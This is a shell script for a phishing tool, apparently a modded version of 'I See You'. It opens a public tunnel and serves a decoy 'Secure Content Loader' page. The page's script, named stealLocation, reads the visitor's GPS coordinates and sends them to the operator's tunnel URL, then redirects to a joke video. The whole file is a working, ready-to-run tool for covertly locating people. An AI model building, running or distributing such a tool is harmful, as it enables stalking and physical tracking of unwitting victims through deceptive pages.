
#!/bin/sh

clear
echo "Starting tunnel... (trying Serveo, then cloudflared, then ngrok, then npx localtunnel)"
echo "-------------------------------------------"

start_serveo() {
    ssh -o ConnectTimeout=10 -R 80:localhost:8080 serveo.net 2>&1 | tee ~/gps.log &
    SSH_PID=$!
    sleep 8
    if ! kill -0 $SSH_PID 2>/dev/null; then
        return 1
    fi
    return 0
}

start_cloudflared() {
    if command -v cloudflared >/dev/null 2>&1; then
        cloudflared tunnel --url http://localhost:8080 --logfile ~/gps.log > /dev/null 2>&1 &
        CLOUDFLARE_PID=$!
        sleep 8
        if ! kill -0 $CLOUDFLARE_PID 2>/dev/null; then
            return 1
        fi
        return 0
    else
        return 1
    fi
}

start_ngrok() {
    if command -v ngrok >/dev/null 2>&1; then
        ngrok http 8080 --log=stdout > ~/gps.log 2>&1 &
        NGROK_PID=$!
        sleep 10
        if ! kill -0 $NGROK_PID 2>/dev/null; then
            return 1
        fi
        return 0
    else
        return 1
    fi
}

start_npx() {
    if command -v npx >/dev/null 2>&1; then
        npx localtunnel --port 8080 --print-requests > ~/gps.log 2>&1 &
        NPX_PID=$!
        sleep 8
        if ! kill -0 $NPX_PID 2>/dev/null; then
            return 1
        fi
        return 0
    else
        return 1
    fi
}

if start_serveo; then
    echo "[✓] Serveo tunnel started."
    TUNNEL_TYPE="Serveo"
    TUNNEL_PID=$SSH_PID
elif start_cloudflared; then
    echo "[✓] Cloudflared tunnel started."
    TUNNEL_TYPE="Cloudflared"
    TUNNEL_PID=$CLOUDFLARE_PID
elif start_ngrok; then
    echo "[✓] Ngrok tunnel started."
    TUNNEL_TYPE="Ngrok"
    TUNNEL_PID=$NGROK_PID
elif start_npx; then
    echo "[✓] NPX Localtunnel started."
    TUNNEL_TYPE="Localtunnel (npx)"
    TUNNEL_PID=$NPX_PID
else
    echo "[✗] All tunnel services failed to start. Please install Serveo, cloudflared, ngrok, or npx localtunnel."
    exit 1
fi

clear

cat << "EOF"
██╗    ███████╗███████╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
██║    ██╔════╝██╔════╝██╔════╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
██║    ███████╗█████╗  █████╗       ╚████╔╝ ██║   ██║██║   ██║
██║    ╚════██║██╔══╝  ██╔══╝        ╚██╔╝  ██║   ██║██║   ██║
██║    ███████║███████╗███████╗       ██║   ╚██████╔╝╚██████╔╝
╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝

[+] Author: Viral Maniar  
[+] Modded by: Techguy origin (on TikTok)  
[+] Description: This tool uses Serveo to find the exact location of the user during social engineering or phishing engagements.

EOF

echo
printf 'Enter the URL generated by the tunnel (e.g., https://example.serveo.net): '
read varurl

if [ -z "$varurl" ]; then
    echo "Error: No URL provided. Exiting."
    kill $TUNNEL_PID 2>/dev/null
    exit 1
fi

mkdir -p ~/webpage
cat <<EOF > ~/webpage/index.html
<!DOCTYPE html>
<html>
<head>
    <title>Secure Content Loader</title>
    <style>
        body {
            background-image: url("https://user-images.githubusercontent.com/3501170/55271108-d11b3180-52fb-11e9-97e2-c930be295147.png");
            background-size: cover;
            background-repeat: no-repeat;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            text-shadow: 1px 1px 2px black;
            flex-direction: column;
        }
        .loading {
            font-size: 1.5em;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="loading">Loading secure content...</div>

    <script>
        function httpGet(theUrl) {
            fetch(theUrl, { mode: 'no-cors' }).catch(err => console.log("Error sending location:", err));
        }

        function stealLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const coords = position.coords.latitude + ',' + position.coords.longitude;
                        const url = "$varurl/logme/" + coords;
                        httpGet(url);

                        setTimeout(() => {
                            window.location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
                        }, 3000);
                    },
                    function(err) {
                        console.log("Geolocation error:", err);
                    }
                );
            }
        }

        setTimeout(stealLocation, 1500);
    </script>
</body>
</html>
EOF

cd ~/webpage || exit 1

if command -v python3 >/dev/null 2>&1; then
    python3 -m http.server 8080 >/dev/null 2>&1 &
    SERVER_PID=$!
    echo "[✓] Server started using Python at http://localhost:8080"
elif command -v busybox >/dev/null 2>&1; then
    busybox httpd -f -p 8080 &
    SERVER_PID=$!
    echo "[✓] Server started using BusyBox at http://localhost:8080"
elif command -v ncat >/dev/null 2>&1; then
    while true; do
        { echo -ne "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"; cat index.html; } | ncat -l 8080
    done &
    SERVER_PID=$!
    echo "[✓] Server started using ncat at http://localhost:8080"
else
    echo "[✗] No supported web server found (python3, busybox, or ncat required)."
    kill $TUNNEL_PID 2>/dev/null
    exit 1
fi

trap 'echo "\n[+] Cleaning up..."; kill $TUNNEL_PID $SERVER_PID 2>/dev/null' EXIT

echo "-------------------------------------------"
echo "[✓] Tunnel active via $TUNNEL_TYPE: $varurl"
echo "[✓] Web server running on http://localhost:8080"
echo "[*] Press Ctrl+C to stop..."
wait